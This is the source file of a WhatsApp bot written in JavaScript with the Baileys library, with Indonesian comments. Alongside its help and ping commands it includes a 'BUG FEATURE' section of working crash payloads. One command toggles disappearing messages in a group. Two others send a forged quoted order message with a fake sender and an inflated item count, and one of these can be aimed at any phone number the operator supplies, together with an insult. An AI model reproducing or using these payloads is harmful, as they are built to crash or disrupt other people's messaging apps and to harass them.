const { MessageType, Presence, Mimetype, WA_DEFAULT_EPHEMERAL } = require("@adiwajshing/baileys")

// LOADER
const fs = require("fs")
const { spawn, exec } = require("child_process")
const { color, bgcolor } = require('./lib/color')
const { fetchJson, fetchText, getBase64 } = require('./lib/fetcher')
const { sleep, uploadImages, getBuffer, getGroupAdmins, getRandom } = require('./lib/functions')
const { msg } = require('./msg')

// MODULE INSTALLED
const axios = require("axios")
const moment = require("moment-timezone")
const fetch = require('node-fetch')
const speed = require('performance-now')
const request = require('request')

// CONFIGS
var selep = true
var gambar64 = '' || fs.readFileSync('./zenz/fake.jpeg')
var prefix = "."

module.exports = client = async (client, mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.prefix

        mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]        
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		
        const command = body.slice(1).trim().split(/ +/).shift().toLowerCase()		
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
        const ar = args.map((v) => v.toLowerCase())
		const q = args.join(' ')
        const ownerNumber = ["6281288339373@s.whatsapp.net"]
		const botNumber = client.user.jid
		const isGroup = from.endsWith('@g.us')
        
        const arg = budy.slice(command.length + 2, budy.length)
		const sender = isGroup ? mek.participant : mek.key.remoteJid
		const totalchat = await client.chats.all()
		const groupMetadata = isGroup ? await client.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const isOwner = ownerNumber.includes(sender)
        const conts = mek.key.fromMe ? client.user.jid : client.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? client.user.name : conts.notify || conts.vname || conts.name || '-'


        const reply = (teks) => {
            client.sendMessage(from, teks, text)
        }


		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')

        if (isGroup && isCmd) console.log(color(`[${time}]`, 'yellow'), color(`[ ${prefix + command} ]`), 'from', color(sender.split("@")[0], 'cyan'), 'in', color(groupName))
        if (!isGroup && isCmd) console.log(color(`[${time}]`, 'yellow'), color(`[ ${prefix + command} ]`), 'from', color(sender.split("@")[0], 'cyan'))

        if (!mek.key.fromMe && !isOwner && selep === true) return

        switch (command) {

            case 'help':
            case 'menu':
                var punya_wa = "0@s.whatsapp.net"
                var ini_text = "Ｚ Ｈ Ｗ Ｚ Ｅ Ｉ Ｎ"
                cs = {
                    contextInfo: {
                        stanzaId: 'B826873620DD5947E683E3ABE663F263',
                        participant: punya_wa,
                        remoteJid: 'status@broadcast',
                        quotedMessage: {
                            imageMessage: {
                                caption: ini_text,
                                jpegThumbnail: gambar64
                            }
                        }
                    }
                }
                client.sendMessage(from, msg.Help(prefix), text, cs)
            break

            case 'p':
            case 'ping':
                const timestamp = speed();
                const latensi = speed() - timestamp
                exec(`neofetch --stdout`, (error, stdout, stderr) => {
                const child = stdout.toString('utf-8')
                const teks = child.replace(/Memory:/, "Ram:")
                const pingnya = `*${teks}Speed: ${latensi.toFixed(4)} Second*`
                reply(pingnya)
                })
            break

            // BUG FEATURE
            case '.': // BUG GC
                await client.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL) 
                await client.toggleDisappearingMessages(from, 0)
            break

            case '..': // TROLI
                client.sendMessage(mek.key.remoteJid, 'Tutup WhatsApp', MessageType.extendedText, {
                    quoted: {
                        key: {
                            participant: '0@s.whatsapp.net' // Fake sender Jid
                        },
                        message: {
                            orderMessage: {
                                itemCount: 9999999, // Bug
                                status: 1,
                                surface: 1,
                                message: 'messages',
                                orderTitle: 'Z3NT', // Idk what this does
                                sellerJid: '0@s.whatsapp.net' // Seller
                            }
                        }
                    }
                })
            break

            case '...': // TROLI BY NOMOR
                if (!q) return reply('Kirim Nomornya')
                const jida = `${q}@s.whatsapp.net`
                client.sendMessage(jida, 'NIH ANJENG', MessageType.extendedText, {
                    quoted: {
                        key: {
                            participant: '0@s.whatsapp.net' // Fake sender Jid
                        },
                        message: {
                            orderMessage: {
                                itemCount: 9999999, // Bug
                                status: 1,
                                surface: 1,
                                message: 'messages',
                                orderTitle: 'Z3NT', // Idk what this does
                                sellerJid: '0@s.whatsapp.net' // Seller
                            }
                        }
                    }
                })
                reply("success")
            break

        }


        } catch (e) {
            e = String(e)
            if (!e.includes("this.isZero")) {
                console.log('Message : %s', color(e, 'green'))
            }
        }

}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////